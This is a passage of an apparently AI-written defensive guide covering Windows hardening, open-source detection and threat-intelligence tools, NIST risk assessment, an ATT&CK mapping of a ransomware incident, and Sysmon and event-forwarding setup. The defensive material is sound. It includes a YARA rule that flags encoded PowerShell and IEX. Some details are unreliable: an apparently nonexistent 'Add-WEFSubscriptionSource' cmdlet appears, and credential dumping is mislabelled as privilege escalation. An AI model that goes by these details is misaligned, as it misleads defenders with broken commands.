[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')

# Verify current mode
$ExecutionContext.SessionState.LanguageMode
```

#### 6. **Windows Firewall with Advanced Security**

**Enable Logging:**
```powershell
# Enable firewall logging
Set-NetFirewallProfile -Profile Domain,Public,Private `
  -LogBlocked True -LogAllowed False `
  -LogFileName "%systemroot%\system32\LogFiles\Firewall\pfirewall.log"
```

**Monitor Rules:**
```powershell
# List all firewall rules
Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | 
  Select-Object DisplayName, Direction, Action

# Export rules
Get-NetFirewallRule | Export-Csv firewall_rules.csv
```

#### 7. **AppLocker**
Application whitelisting solution built into Windows.

**Configuration:**
```powershell
# Get AppLocker policy
Get-AppLockerPolicy -Effective

# Create default rules
Get-AppLockerFileInformation -Directory C:\Windows -Recurse | 
  New-AppLockerPolicy -RuleType Publisher,Hash -User Everyone -Optimize
```

**Rule Types:**
- Publisher rules (based on digital signature)
- Path rules (based on file location)
- Hash rules (based on file hash)

#### 8. **EMET / Exploit Protection**
Exploit mitigation features in Windows.

**Windows 10/11 Exploit Protection:**
```powershell
# Export current settings
Get-ProcessMitigation -System | Export-Clixml exploit_protection.xml

# Apply exploit protection settings
Set-ProcessMitigation -PolicyFilePath exploit_protection.xml
```

**Key Protections:**
- DEP (Data Execution Prevention)
- ASLR (Address Space Layout Randomization)
- SEHOP (Structured Exception Handler Overwrite Protection)
- Control Flow Guard

---

### Open Source Tools for Threat Detection

#### 1. **Wazuh** (Recommended)
Wazuh is an open-source platform for threat detection and incident response, renowned for its adaptability and integration capabilities, providing Security Information and Event Management (SIEM) solutions with monitoring, detection, and alerting of security events and incidents.

**Features:**
- Host-based intrusion detection (HIDS)
- Log analysis and correlation
- File integrity monitoring
- Rootkit detection
- Real-time alerting
- Compliance monitoring (PCI-DSS, HIPAA, GDPR)
- Integration with VirusTotal, TheHive, and other tools

**Installation:**
```bash
# For Ubuntu/Debian
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list
apt-get update
apt-get install wazuh-manager
```

**Use Cases:**
- Endpoint monitoring and protection
- Log management and analysis
- Compliance auditing
- Threat detection and response

#### 2. **OSSEC (Open Source Security Event Correlator)**
OSSEC is a robust, host-based intrusion detection system that continuously monitors and analyzes system activity, providing real-time alerts and logs with capabilities including log analysis, file integrity monitoring, rootkit detection, and active response.

**Features:**
- Multi-platform support (Windows, Linux, macOS)
- Centralized log analysis
- Active response capabilities
- Agentless monitoring options

#### 3. **Snort**
Snort is the foremost Open Source Intrusion Prevention System in the world, using a series of rules that help define malicious network activity to find packets that match against them and generate alerts for users.

**Features:**
- Real-time traffic analysis
- Packet logging
- Protocol analysis
- Content searching/matching
- Can be deployed inline to stop malicious packets

**Installation:**
```bash
# For Ubuntu/Debian
apt-get install snort
```

**Use Cases:**
- Network intrusion detection
- Traffic analysis
- Packet sniffing and logging

#### 4. **ClamAV**
ClamAV is an open-source antivirus engine designed to detect trojans, viruses, malware, and other malicious threats, commonly used in Unix-based systems but also compatible with other operating systems.

**Features:**
- Multi-platform support
- Real-time scanning
- Regular virus definition updates
- Command-line and daemon modes
- Integration with mail servers

**Installation:**
```bash
# For Ubuntu/Debian
apt-get install clamav clamav-daemon

# Update virus definitions
freshclam

# Scan a directory
clamscan -r /home/user/
```

#### 5. **YARA**
YARA supports complex boolean expressions in rules, making it possible to combine multiple conditions for more accurate detections, with cross-platform compatibility operating on Windows, Linux, and Mac OS X.

**Features:**
- Pattern matching for malware identification
- Boolean logic for complex rules
- Python integration (yara-python)
- Command-line interface

**Example YARA Rule:**
```yara
rule SuspiciousPowerShell
{
    strings:
        $a = "powershell" nocase
        $b = "-enc" nocase
        $c = "IEX" nocase
    condition:
        2 of them
}
```

#### 6. **Security Onion**
Security Onion is an open-source Linux distribution for threat hunting, security monitoring, and log management, including ELK, Snort, Suricata, Zeek, Wazuh, Sguil, and many other security tools.

**Included Tools:**
- Elasticsearch, Logstash, Kibana (ELK Stack)
- Snort/Suricata (IDS/IPS)
- Zeek (Network analysis)
- Wazuh (HIDS)
- TheHive (Incident response)

#### 7. **OpenVAS (Open Vulnerability Assessment System)**
OpenVAS is a powerful vulnerability scanner powered by a large database of known vulnerabilities, enabling detection across different systems and applications with customizable scanning and detailed reporting with risk levels and remediation recommendations.

**Features:**
- Extensive vulnerability database
- Network and compliance scanning
- Detailed reporting
- Regular updates
- Web-based interface

#### 8. **Zeek (formerly Bro)**
Zeek is an open-source network analysis framework that operates on a versatile sensor that can be a hardware, software, virtual, or cloud platform.

**Features:**
- Network traffic analysis
- Protocol analysis
- Anomaly detection
- Log generation
- Scriptable event engine

#### 9. **AIDE (Advanced Intrusion Detection Environment)**

**Features:**
- File integrity monitoring
- Checksums and cryptographic hashes
- Regular expression support
- Cross-platform compatibility

**Installation:**
```bash
# For Ubuntu/Debian
apt-get install aide

# Initialize database
aideinit

# Check for changes
aide --check
```

#### 10. **Wireshark**
Wireshark provides visual tools like flow graphs and IO graphs to help understand data flow and spot anomalies, essential for network engineers and security professionals in diagnosing network problems and detecting malicious activities.

**Features:**
- Deep packet inspection
- Live capture and offline analysis
- Rich VoIP analysis
- Protocol decryption
- Powerful display filters

---

## Risk Management Assessment Tools

### NIST-Based Risk Assessment Tools

#### 1. **NIST Cybersecurity Framework Tools**

**Online Resources:**
- CSF Reference Tool (csf.tools)
- Informative References mapping
- Implementation Examples
- Quick Start Guides
- Community Profiles

#### 2. **NIST Privacy Risk Assessment Methodology (PRAM)**
The PRAM is a tool that applies the risk model from NISTIR 8062 and helps organizations analyze, assess, and prioritize privacy risks to determine how to respond and select appropriate solutions.

**Components:**
- Worksheet 1: Framing Business Objectives
- Worksheet 2: Assessing System Design
- Worksheet 3: Prioritizing Risk
- Worksheet 4: Selecting Controls
- Catalog of Problematic Data Actions

#### 3. **SimpleRisk**

**Features:**
- Risk management application
- Risk assessment workflows
- Compliance management
- Integration with vulnerability scanners
- Risk dashboard and reporting

**Key Capabilities:**
- Risk registration and tracking
- Risk scoring (likelihood × impact)
- Treatment plan management
- Compliance mapping (NIST, ISO 27001, PCI-DSS)

#### 4. **ERAMBA**

**Features:**
- GRC platform (Governance, Risk, Compliance)
- Risk assessment and treatment
- Policy management
- Third-party risk management
- Compliance tracking

#### 5. **RiskWatch**

**Features:**
- Automated risk assessments
- Compliance framework mapping
- Quantitative risk analysis
- Asset valuation
- Control effectiveness tracking

### Commercial Tools with Free Tiers

#### 1. **Qualys Community Edition**
- Vulnerability management
- Cloud security
- Container security
- Web application scanning

#### 2. **Tenable Nessus Essentials**
- Vulnerability scanning (up to 16 IPs)
- Configuration auditing
- Compliance checking

#### 3. **Rapid7 InsightVM Community Edition**
- Vulnerability management
- Asset discovery
- Risk prioritization

---

## Open Source Threat Intelligence Platforms

### 1. **MISP (Malware Information Sharing Platform)**
MISP is an open-source threat intelligence platform that enables organizations to share threat intelligence data with trusted partners, featuring many MISP galaxy clusters including MITRE ATT&CK, Exploit-Kit, Microsoft Activity Group actor, Ransomware, and Threat actor information.

**Key Features:**
- Threat intelligence sharing
- STIX/TAXII support
- Correlation engine
- API for automation (PyMISP)
- MITRE ATT&CK integration
- Taxonomies and galaxy clusters

**Use Cases:**
- Indicator of Compromise (IoC) management
- Threat actor tracking
- Campaign analysis
- Collaborative threat research

**Installation:**
```bash
# Using Docker
git clone https://github.com/MISP/misp-docker
cd misp-docker
docker-compose up -d
```

### 2. **OpenCTI (Open Cyber Threat Intelligence)**
OpenCTI is an open-source cyber threat intelligence tool available at no cost on GitHub that structures threat data based on the STIX 2 standards, offering a comprehensive and robust solution businesses can use as their primary threat intelligence platform.

**Features:**
- STIX 2.1 data model
- Knowledge graph visualization
- Connector ecosystem
- Custom dashboard creation
- Playbook automation

### 3. **TheHive**

**Features:**
- Security incident response platform
- Case management
- Observable enrichment
- Integration with MISP
- Cortex analyzers for automation

### 4. **AlienVault OTX (Open Threat Exchange)**

**Features:**
- Community-driven threat intelligence
- Pulse feeds (IoC collections)
- API access
- Integration with security tools

### 5. **Threat Bus**
Threat Bus is a threat intelligence dissemination layer to connect security tools through a distributed publish/subscribe message broker.

**Features:**
- Intelligence distribution
- Tool integration
- Pub/sub architecture

### 6. **Intel Owl**
Intel Owl is an Open Source Intelligence solution to get threat intelligence data about a specific file, an IP or a domain from a single API at scale.

**Features:**
- Multiple analyzer integration
- File, IP, and domain analysis
- API access
- Extensible plugin system

### 7. **Yeti (Your Everyday Threat Intelligence)**

**Features:**
- Threat intelligence repository
- Observable management
- Entity tracking
- API for automation

---

## Risk Assessment Process

### NIST SP 800-30 Risk Assessment Methodology

NIST outlines four primary steps in the risk assessment process: prepare for the assessment, conduct the assessment, communicate the assessment results, and maintain the assessment.

#### Step 1: Prepare for Assessment

**Activities:**
- Define assessment scope and boundaries
- Identify purpose and use of assessment
- Define risk model and assessment approach
- Gather organizational context
- Identify sources of threat information
- Identify sources of vulnerability information

**Key Documents:**
- Risk assessment plan
- Risk framing document
- Asset inventory
- Data flow diagrams

#### Step 2: Conduct the Assessment

##### 2.1 Identify Threats

**Threat Sources:**
- Adversarial (hackers, insiders, competitors)
- Accidental (user errors, equipment failures)
- Structural (system complexity, outdated technology)
- Environmental (natural disasters, power failures)

**Threat Events:**
- Unauthorized access
- Data breach
- Malware infection
- Denial of service
- Supply chain compromise

##### 2.2 Identify Vulnerabilities

**Vulnerability Categories:**
- Technical (unpatched systems, misconfigurations)
- Operational (inadequate procedures, poor training)
- Management (insufficient policies, lack of oversight)

**Discovery Methods:**
- Vulnerability scanning
- Penetration testing
- Configuration audits
- Code review
- Security assessments

##### 2.3 Determine Likelihood

**Likelihood Factors:**
- Threat source capability and intent
- Vulnerability severity
- Control effectiveness

**Likelihood Levels:**
- Very High (>80%)
- High (60-80%)
- Moderate (40-60%)
- Low (20-40%)
- Very Low (<20%)

##### 2.4 Determine Impact

**Impact Categories:**
- Confidentiality (data disclosure)
- Integrity (data modification)
- Availability (service disruption)

**Impact Areas:**
- Mission/Business operations
- Organizational assets
- Individuals (privacy)
- Other organizations
- National security

**Impact Levels:**
- Very High: Catastrophic consequences
- High: Severe consequences
- Moderate: Serious consequences
- Low: Limited consequences
- Very Low: Negligible consequences

##### 2.5 Calculate Risk

**Risk Formula:**
```
Risk Level = Likelihood × Impact
```

**Risk Matrix:**
```
              Impact
           VL  L   M   H   VH
        ┌─────────────────────┐
     VH │ M   H   H   VH  VH  │
      H │ L   M   H   H   VH  │
L     M │ L   M   M   H   H   │
i     L │ VL  L   M   M   H   │
k    VL │ VL  VL  L   L   M   │
e       └─────────────────────┘
l
i
h
o
o
d
```

Legend: VL=Very Low, L=Low, M=Moderate, H=High, VH=Very High

#### Step 3: Communicate Results

**Risk Assessment Report Components:**
- Executive summary
- Assessment methodology
- Asset inventory
- Threat landscape
- Vulnerability findings
- Risk register (likelihood, impact, risk level)
- Risk treatment recommendations
- Residual risk assessment

**Risk Register Example:**

| Risk ID | Threat | Vulnerability | Likelihood | Impact | Risk Level | Treatment |
|---------|--------|---------------|------------|--------|------------|-----------|
| R001 | Ransomware | Unpatched systems | High | Very High | Very High | Patch management |
| R002 | Phishing | Untrained users | High | High | High | Security awareness |
| R003 | Insider threat | Excessive privileges | Moderate | High | High | Access control review |

#### Step 4: Maintain the Assessment

**Maintenance Activities:**
- Regular risk assessment updates
- Continuous monitoring
- Control effectiveness evaluation
- Threat intelligence integration
- Incident lessons learned
- Change management tracking

**Update Triggers:**
- Significant system changes
- New threats identified
- Control implementation
- Organizational changes
- Regulatory updates

---

## Implementation Recommendations

### Phase 1: Foundation (Months 1-3)

**Week 1-4: Assessment and Planning**
1. Establish governance structure
2. Define scope and boundaries
3. Conduct initial asset inventory
4. Identify key stakeholders
5. Select initial toolset

**Week 5-8: Tool Deployment**
1. Install and configure Wazuh for endpoint monitoring
2. Deploy Snort for network intrusion detection
3. Implement ClamAV for antivirus protection
4. Set up vulnerability scanning (OpenVAS)
5. Configure logging and alerting

**Week 9-12: Risk Assessment**
1. Conduct initial risk assessment
2. Document threats and vulnerabilities
3. Calculate risk levels
4. Develop risk treatment plan
5. Create risk register

### Phase 2: Enhancement (Months 4-6)

**Threat Intelligence Integration**
1. Deploy MISP platform
2. Configure threat feeds
3. Integrate with detection tools
4. Establish sharing groups
5. Create custom taxonomies

**Advanced Detection**
1. Implement behavioral analytics
2. Deploy YARA rules
3. Configure correlation rules
4. Enhance monitoring coverage
5. Tune false positive rates

**Risk Management Maturity**
1. Implement continuous monitoring
2. Automate risk assessments
3. Integrate with change management
4. Establish risk metrics and KPIs
5. Create risk dashboard

### Phase 3: Optimization (Months 7-12)

**Automation and Integration**
1. API integration between tools
2. Automated playbooks (SOAR)
3. Threat hunting workflows
4. Automated remediation
5. Self-service portals

**Continuous Improvement**
1. Regular tool updates
2. Threat intelligence enrichment
3. Control effectiveness testing
4. Penetration testing
5. Tabletop exercises

**Compliance and Reporting**
1. NIST CSF profile creation
2. Compliance mapping
3. Executive dashboards
4. Automated reporting
5. Audit preparation

### Best Practices

#### 1. Governance
- Establish clear roles and responsibilities
- Define risk appetite and tolerance
- Create policies and procedures
- Ensure executive sponsorship
- Regular risk committee meetings

#### 2. Asset Management
- Maintain accurate inventory
- Classify assets by criticality
- Track asset lifecycle
- Document dependencies
- Regular inventory audits

#### 3. Threat Detection
- Layer detection controls
- Tune for environment
- Regular rule updates
- Hunt for threats proactively
- Review alerts daily

#### 4. Risk Assessment
- Use consistent methodology
- Document all assumptions
- Involve stakeholders
- Update regularly
- Track treatment progress

#### 5. Incident Response
- Develop playbooks
- Define escalation paths
- Conduct regular drills
- Document lessons learned
- Update procedures

#### 6. Training and Awareness
- Security awareness program
- Role-based training
- Simulated phishing
- Tool-specific training
- Certification support

### Tool Integration Architecture

```
┌─────────────────────────────────────────────────────┐
│              GOVERNANCE & RISK MANAGEMENT           │
│                 (NIST CSF Framework)                │
└────────────────────┬────────────────────────────────┘
                     │
        ┌────────────┴────────────┐
        ▼                         ▼
┌──────────────────┐      ┌──────────────────┐
│  THREAT INTEL    │      │  RISK ASSESSMENT │
│     (MISP)       │◄────►│   (SimpleRisk)   │
└────────┬─────────┘      └──────────────────┘
         │
         │
    ┌────┴─────────────────────────────────┐
    ▼                                       ▼
┌────────────────┐                 ┌────────────────┐
│   DETECTION    │                 │   MONITORING   │
│  (Wazuh/Snort) │◄───────────────►│  (ELK Stack)   │
└────────┬───────┘                 └────────────────┘
         │
         │
    ┌────┴─────────────────┐
    ▼                      ▼
┌──────────────┐    ┌──────────────┐
│   RESPONSE   │    │  RECOVERY    │
│  (TheHive)   │◄───│  (Playbooks) │
└──────────────┘    └──────────────┘
```

### Metrics and KPIs

#### Security Metrics
- Mean Time to Detect (MTTD)
- Mean Time to Respond (MTTR)
- Number of incidents by severity
- False positive rate
- Vulnerability remediation time
- Patch compliance percentage

#### Risk Metrics
- Total number of identified risks
- Risk distribution by level
- Risk treatment progress
- Residual risk trend
- Control effectiveness score
- Risk assessment coverage

#### Operational Metrics
- System availability
- Alert volume
- Tool uptime
- Threat intelligence feeds processed
- Automated vs manual responses
- User training completion rate

---

## Summary

The NIST Cybersecurity Framework 2.0 provides a comprehensive, flexible approach to managing cybersecurity risks. By combining:

1. **NIST CSF 2.0** for strategic risk management
2. **Open-source threat detection tools** for technical controls
3. **Risk assessment methodologies** for quantifying risks
4. **Threat intelligence platforms** for staying informed

Organizations can build a robust, cost-effective cybersecurity program that:
- Identifies and prioritizes risks systematically
- Detects threats in real-time
- Responds effectively to incidents
- Recovers quickly from compromises
- Continuously improves security posture

### Key Takeaways

1. **Start with governance** - Establish clear risk management strategy and policies
2. **Know your assets** - Maintain accurate inventories and classifications
3. **Layer your defenses** - Use multiple detection mechanisms
4. **Assess risks regularly** - Use consistent, repeatable methodology
5. **Share intelligence** - Participate in threat sharing communities
6. **Automate where possible** - Reduce manual effort and response times
7. **Train your people** - Security is everyone's responsibility
8. **Measure and improve** - Track metrics and continuously enhance

### Next Steps

1. Review your current security posture against NIST CSF
2. Select and deploy appropriate tools from this guide
3. Conduct initial risk assessment
4. Create organizational profile (current and target states)
5. Develop implementation roadmap
6. Begin phased deployment
7. Establish monitoring and metrics
8. Review and adjust quarterly

---

## Complete MITRE ATT&CK Tracking Example: Summary

### Attack Overview

**Threat**: Conti/Akira-style Ransomware
**Duration**: 14 days (from initial reconnaissance to impact)
**Systems Affected**: 150+ Windows endpoints
**Data Encrypted**: 2.3 million files
**Data Exfiltrated**: 45 GB

### MITRE ATT&CK Mapping

| # | Tactic | Technique | ID | Description | Detection | Status |
|---|--------|-----------|-----|-------------|-----------|--------|
| 1 | Reconnaissance | Vulnerability Scanning | T1595.002 | External network scanning | Network IDS alerts | ✓ Detected |
| 2 | Initial Access | Spearphishing Attachment | T1566.001 | Malicious Excel macro | Email gateway | ✗ Missed |
| 3 | Execution | PowerShell | T1059.001 | Malicious script execution | Sysmon Event ID 1 | ✓ Detected |
| 4 | Persistence | Scheduled Task | T1053.005 | Hourly check-in task | Event ID 4698 | ✓ Detected |
| 5 | Privilege Escalation | LSASS Memory | T1003.001 | Credential dumping | Sysmon Event ID 10 | ✓ Detected |
| 6 | Defense Evasion | Disable Tools | T1562.001 | Disabled Windows Defender | Registry monitoring | ⚠ Delayed |
| 7 | Credential Access | Password Spraying | T1110.003 | Domain account compromise | Event ID 4771 | ✓ Detected |
| 8 | Discovery | Remote System Discovery | T1018 | Network enumeration | AD query logs | ⚠ Delayed |
| 9 | Lateral Movement | SMB/Admin Shares | T1021.002 | PsExec deployment | Sysmon Event ID 3 | ✓ Detected |
| 10 | Collection | Archive via Utility | T1560.001 | Data compression | File monitoring | ✓ Detected |
| 11 | Command and Control | Web Protocols | T1071.001 | HTTPS C2 channel | Network analysis | ⚠ Delayed |
| 12 | Exfiltration | Exfil Over C2 | T1041 | 45 GB uploaded | DLP alerts | ✓ Detected |
| 13 | Impact | Data Encrypted | T1486 | Ransomware deployment | Mass file changes | ✓ Detected |

**Legend**: ✓ Detected in real-time | ⚠ Detected with delay | ✗ Not detected

### Detection Timeline

```
Day 1  [Recon]           ████░░░░░░░░░░░░  Detected (Network IDS)
Day 3  [Initial Access]  ░░░░░░░░░░░░░░░░  Missed (Macro execution)
Day 3  [Execution]       ████████░░░░░░░░  Detected (Sysmon)
Day 5  [Persistence]     ████████░░░░░░░░  Detected (Event logs)
Day 5  [Priv Esc]        ████████████░░░░  Detected (LSASS access)
Day 6  [Defense Evasion] ░░░░████████░░░░  Delayed detection
Day 7  [Cred Access]     ████████████░░░░  Detected (Auth logs)
Day 8  [Discovery]       ░░░░░░░░████░░░░  Delayed detection
Day 9  [Lateral Move]    ████████████████  Detected (Network monitoring)
Day 11 [Collection]      ████████████████  Detected (File monitoring)
Day 12 [C2]             ░░░░░░░░████░░░░  Delayed detection
Day 13 [Exfiltration]   ████████████████  Detected (DLP)
Day 14 [Impact]         ████████████████  Detected (Ransomware)

█ = Real-time detection  ░ = Missed or delayed
```

### Tools Used for Detection

#### Windows Environment
| Tool | Purpose | Key Detections |
|------|---------|----------------|
| Sysmon | Process & network monitoring | Process creation, LSASS access, file creation |
| Windows Event Log | System activity logging | Authentication, scheduled tasks, services |
| PowerShell Logging | Script execution tracking | Malicious commands, encoded scripts |
| Windows Defender | Anti-malware | Blocked some malware variants |
| Windows Firewall | Network filtering | Logged network connections |

#### Security Stack
| Tool | Purpose | Key Detections |
|------|---------|----------------|
| Email Gateway | Phishing detection | Blocked similar emails post-incident |
| EDR Platform | Endpoint threat detection | Behavioral analysis, threat hunting |
| SIEM (Splunk) | Log aggregation & correlation | Attack pattern identification |
| Network IDS (Snort) | Network intrusion detection | Reconnaissance, C2 traffic |
| DLP Solution | Data exfiltration prevention | Large outbound data transfers |

### Response Actions Taken

| Phase | Action | Tool Used | Outcome |
|-------|--------|-----------|---------|
| Detection | Alert on LSASS access | Sysmon + SIEM | Identified credential theft |
| Analysis | Investigate process tree | Process Explorer | Mapped attack chain |
| Containment | Isolate affected systems | Network segmentation | Stopped lateral spread |
| Eradication | Remove persistence mechanisms | Autoruns + PowerShell | Cleaned scheduled tasks |
| Recovery | Restore from backups | Veeam Backup | Full recovery in 48 hours |
| Lessons Learned | Update detection rules | ATT&CK Navigator | Improved coverage |

### Integration Architecture for Windows

```
┌─────────────────────────────────────────────────────────────┐
│                  Windows Endpoint (Workstation/Server)      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
│  │   Sysmon     │  │  PowerShell  │  │   Windows    │     │
│  │  (Detailed   │  │   Logging    │  │   Defender   │     │
│  │   Events)    │  │  (Scripts)   │  │   (AV/EDR)   │     │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘     │
│         │                  │                  │              │
│         └──────────────────┼──────────────────┘              │
│                            │                                 │
│  ┌─────────────────────────▼──────────────────────────┐     │
│  │         Windows Event Log                          │     │
│  │  - Security (4624, 4625, 4698, etc.)              │     │
│  │  - Sysmon/Operational (1, 3, 10, 11, etc.)       │     │
│  │  - PowerShell/Operational                         │     │
│  │  - Application                                     │     │
│  │  - System                                          │     │
│  └─────────────────────────┬──────────────────────────┘     │
│                            │                                 │
└────────────────────────────┼─────────────────────────────────┘
                             │
                             │ WEF/Forwarder/Agent
                             │
┌────────────────────────────▼─────────────────────────────────┐
│                   Log Collection Layer                       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌────────────────┐  ┌────────────────┐  ┌──────────────┐  │
│  │  Windows Event │  │  Syslog/WMI    │  │  Commercial  │  │
│  │  Forwarding    │  │  Collectors    │  │  Agents      │  │
│  │  (WEF)         │  │  (NXLog, etc)  │  │  (Splunk UF) │  │
│  └───────┬────────┘  └───────┬────────┘  └──────┬───────┘  │
│          │                   │                   │           │
└──────────┼───────────────────┼───────────────────┼───────────┘
           │                   │                   │
           └───────────────────┼───────────────────┘
                               │
┌──────────────────────────────▼───────────────────────────────┐
│                     SIEM Platform                            │
│                   (Splunk / Wazuh / ELK)                     │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌────────────────────────────────────────────────────┐     │
│  │  Log Aggregation & Normalization                   │     │
│  │  - Parse Sysmon events                              │     │
│  │  - Extract fields (CommandLine, ParentImage, etc.) │     │
│  │  - Correlate across multiple sources                │     │
│  └────────────────────┬───────────────────────────────┘     │
│                       │                                      │
│  ┌────────────────────▼───────────────────────────────┐     │
│  │  Detection Rules (MITRE ATT&CK Mapped)             │     │
│  │  - Sigma rules converted to SIEM syntax             │     │
│  │  - Custom correlation rules                         │     │
│  │  - Machine learning anomaly detection               │     │
│  └────────────────────┬───────────────────────────────┘     │
│                       │                                      │
│  ┌────────────────────▼───────────────────────────────┐     │
│  │  Alert Management                                   │     │
│  │  - Priority scoring                                 │     │
│  │  - False positive filtering                         │     │
│  │  - Alert enrichment with threat intel               │     │
│  └────────────────────┬───────────────────────────────┘     │
│                       │                                      │
└───────────────────────┼──────────────────────────────────────┘
                        │
┌───────────────────────▼──────────────────────────────────────┐
│              Security Orchestration & Response               │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │   TheHive    │  │   Playbooks  │  │  MISP Threat │      │
│  │  (Case Mgmt) │  │  (Automated  │  │  Intelligence│      │
│  │              │  │   Response)  │  │   (IOCs)     │      │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘      │
│         │                  │                  │              │
│         └──────────────────┼──────────────────┘              │
│                            │                                 │
│  ┌─────────────────────────▼──────────────────────────┐     │
│  │  Response Actions:                                 │     │
│  │  - Isolate endpoint (firewall rules)              │     │
│  │  - Kill malicious processes                       │     │
│  │  - Block C2 domains                               │     │
│  │  - Create forensic snapshots                      │     │
│  │  - Notify SOC analysts                            │     │
│  └────────────────────────────────────────────────────┘     │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Implementation Guide for Windows Environment

#### Step 1: Deploy Sysmon (Week 1-2)

**1.1 Download and Install:**
```powershell
# Download Sysmon
Invoke-WebRequest -Uri "https://live.sysinternals.com/sysmon64.exe" `
  -OutFile "C:\Tools\sysmon64.exe"

# Download SwiftOnSecurity config
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
  -OutFile "C:\Tools\sysmonconfig.xml"

# Install Sysmon
C:\Tools\sysmon64.exe -accepteula -i C:\Tools\sysmonconfig.xml
```

**1.2 Group Policy Deployment:**
```powershell
# Create GPO for enterprise deployment
# Computer Configuration > Preferences > Windows Settings > Scripts
# Startup script: sysmon64.exe -i sysmonconfig.xml -accepteula
```

**1.3 Verify Installation:**
```powershell
# Check Sysmon service
Get-Service Sysmon64

# View Sysmon events
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10

# Check Sysmon version
sysmon64.exe -c
```

#### Step 2: Enable PowerShell Logging (Week 1)

**2.1 Via Group Policy:**
```
Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell

Enable:
- Turn on Module Logging (*)
- Turn on PowerShell Script Block Logging
- Turn on PowerShell Transcription
- Set transcription output directory: \\fileserver\PSTranscripts
```

**2.2 Via Registry (Alternative):**
```powershell
# Script Block Logging
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name "EnableScriptBlockLogging" -Value 1 -PropertyType DWord -Force

# Module Logging
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
  -Name "EnableModuleLogging" -Value 1 -PropertyType DWord -Force

New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Force
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" `
  -Name "*" -Value "*" -PropertyType String -Force

# Transcription
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" `
  -Name "EnableTranscripting" -Value 1 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" `
  -Name "OutputDirectory" -Value "C:\PSTranscripts" -PropertyType String -Force
```

**2.3 Test PowerShell Logging:**
```powershell
# Generate test events
Get-Process
Invoke-WebRequest -Uri "http://example.com"

# Check logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | 
  Where-Object {$_.Id -eq 4104} | 
  Select-Object -First 5 | 
  Format-List
```

#### Step 3: Configure Windows Event Forwarding (Week 2-3)

**3.1 Configure Collector Server:**
```cmd
# Enable WinRM
winrm quickconfig

# Configure WEF
wecutil qc

# Create subscription
wecutil cs security-events-subscription.xml
```

**3.2 Subscription Configuration File:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<Subscription xmlns="http://schemas.microsoft.com/2006/03/windows/events/subscription">
    <SubscriptionId>Security-Sysmon-PowerShell</SubscriptionId>
    <SubscriptionType>SourceInitiated</SubscriptionType>
    <Description>Collect Security, Sysmon, and PowerShell events</Description>
    <Enabled>true</Enabled>
    <Uri>http://schemas.microsoft.com/wbem/wsman/1/windows/EventLog</Uri>
    <ConfigurationMode>Custom</ConfigurationMode>
    <Delivery Mode="Push">
        <Batching>
            <MaxItems>5</MaxItems>
            <MaxLatencyTime>1000</MaxLatencyTime>
        </Batching>
        <PushSettings>
            <Heartbeat Interval="60000"/>
        </PushSettings>
    </Delivery>
    <Query>
        <QueryList>
            <!-- Security Events -->
            <Query Id="0" Path="Security">
                <Select>*[System[(EventID=4624 or EventID=4625 or EventID=4648 or EventID=4672 or EventID=4698 or EventID=4720 or EventID=4771)]]</Select>
            </Query>
            <!-- Sysmon Events -->
            <Query Id="1" Path="Microsoft-Windows-Sysmon/Operational">
                <Select>*</Select>
            </Query>
            <!-- PowerShell Events -->
            <Query Id="2" Path="Microsoft-Windows-PowerShell/Operational">
                <Select>*[System[(EventID=4103 or EventID=4104)]]</Select>
            </Query>
        </QueryList>
    </Query>
    <ReadExistingEvents>false</ReadExistingEvents>
    <TransportName>HTTP</TransportName>
    <ContentFormat>RenderedText</ContentFormat>
    <Locale Language="en-US"/>
    <LogFile>ForwardedEvents</LogFile>
    <AllowedSourceNonDomainComputers/>
    <AllowedSourceDomainComputers>O:NSG:NSD:(A;;GA;;;DC)(A;;GA;;;NS)</AllowedSourceDomainComputers>
</Subscription>
```

**3.3 Configure Source Computers:**
```powershell
# Add computer to source-initiated subscription
winrm quickconfig
wecutil qc

# Configure collector server
$CollectorServer = "wef-collector.corporate.local"
Add-WEFSubscriptionSource -SubscriptionID "Security-Sysmon-PowerShell" `
  -Collector $CollectorServer
```

#### Step 4: Deploy SIEM Agent (Week 3-4)

**4.1 Wazuh Agent Installation:**
```powershell
# Download Wazuh agent
Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.x.x-1.msi" `
  -OutFile "C:\Temp\wazuh-agent.msi"

# Install agent
msiexec /i C:\Temp\wazuh-agent.msi /q WAZUH_MANAGER="wazuh-manager.corporate.local" `
  WAZUH_AGENT_NAME="$env:COMPUTERNAME"

# Start agent
NET START WazuhSvc
```

**4.2 Wazuh Agent Configuration (ossec.conf):**
```xml
<ossec_config>
